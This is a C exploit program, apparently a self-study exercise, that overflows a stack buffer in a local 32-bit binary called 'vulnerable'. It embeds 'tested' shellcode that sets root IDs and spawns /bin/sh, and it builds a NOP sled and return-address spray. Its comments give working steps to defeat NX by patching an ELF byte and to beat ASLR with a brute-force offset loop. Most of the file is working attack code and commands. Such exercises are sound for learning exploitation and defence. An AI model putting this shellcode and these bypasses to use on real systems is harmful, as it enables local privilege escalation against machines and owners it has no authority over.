#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* 
 * To get this to work, we have to do this first
 * Circumvent NX, so we can execute code on the stack.
 * Circumvent ASLR, so we can predict where our shellcode is.
 * Future directions: ROP may allow us to ignore *both* of these,
 * since (as far as I know), ROP just executed existing code in the
 * .text section of various binaries.
 */


/*
 * If ASLR is *off* then we can easily find the offset with:
 * for i in $(seq -500 50 500); do 
 *  echo "Trying offset $i" && ./exploit "$i" && rm -f core.*; done
 */


/* 1. Circumventing NX
 * ===================
 * This is no problem if we have read access to the binary. 
 * This is common. For example:
 * 
 * $ ls -l /usr/bin/ | grep -Ev '^(.{7})r'
 * 
 * shows that every single binary in my Arch install is world readable.
 * If we can read the binary, then we can copy it to somewhere we have
 * write access, and change the 300th byte from a 0x06 to a 0x07:
 * 
 * # Python code to manually "execstack" a binary
 * import mmap
 * f = open("vulnerable", "a+")
 * m = mmap.mmap(f.fileno(), 0)
 * m[300] = 7   # It should have been 6 before
 * m.close()
 * f.close()
 * 
 * A less clever solution is to use execstack (in the prelink package):
 * $ execstack -s <victim-prog>
 */


/* 2. Circumventing ASLR
 * =====================
 * There's an impractical solution and a practical one.
 * (a) Folks on the internet just say to disable it using sysfs, via:
 * 
 * # su -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
 * 
 * This requires root access, so while it's good *for* practice, 
 * it's kinda pointless *in* practice.
 * 
 * (b) My solution: Just fucking brute-force it!
 * I've tried this, and it works.
 * The typical distance between the stack of a parent process and a child
 * process is large, but not massive. A typical run gives 0xfff3b748
 * vs 0xffa76458. This difference can be negative, so we have
 * to try a window stretching across memory in both directions. 
 * However, we only have to try once for every N memory addresses, 
 * where N is the length of our NOP sled. And there's no reason we can't 
 * try multiple times!
 */

/* BRINGING IT ALL TOGETHER
 * ========================
 * Set-up a simulated environment as follows.
 * $ gcc -g -m32 -o vulnerable{.safe,.c}
 * $ sudo chmod -w vulnerable.safe
 * 
 * We've now got a non-writeable binary with a vulnerability. Here we go:
 * $ cp vulnerable.safe vulnerable
 * $ chmod a+w vulnerable
 * $ ./my-execstack     # Executes the python code above
 * # Verify that ASLR is ON! We want to make this hard for ourselves ;)
 * $ cat /proc/sys/kernel/randomize_va_space    # Should be 1
 * for i in $(seq -500000 50 500000); do echo "Trying offset $i" && 
 *      ./exploit "$i" && rm -f core.*; done
 */

/* Tested shellcode. It works. */
char shellcode[] =
    "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
    "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
    "\xe1\xcd\x80";

int main(int argc, char *argv[]) {
    unsigned int i, *ptr, ret, offset = 148;
    char *command, *buffer;

    command = (char *) malloc(200);

    bzero(command, 200); // Zero out the new memory.

    strcpy(command, "./vulnerable \'"); // Start command buffer.

    buffer = command + strlen(command); // Set buffer at the end.

    if (argc > 1) // Set offset.
        offset = atoi(argv[1]);

    ret = (unsigned int) &i - offset; // Set return address.
    for (i = 0; i < 160; i += 4)      // Fill buffer with return address
        *((unsigned int *)(buffer+i)) = ret;

    memset(buffer, 0x90, 60); // Build NOP sled.
    memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

    strcat(command, "\'");

    printf("ret @ 0x%08x\n", ret);
    // *(int *)(buffer+116) = 0x08048561;

    system(command); // Run exploit.

    free(command);
    return 0;
}
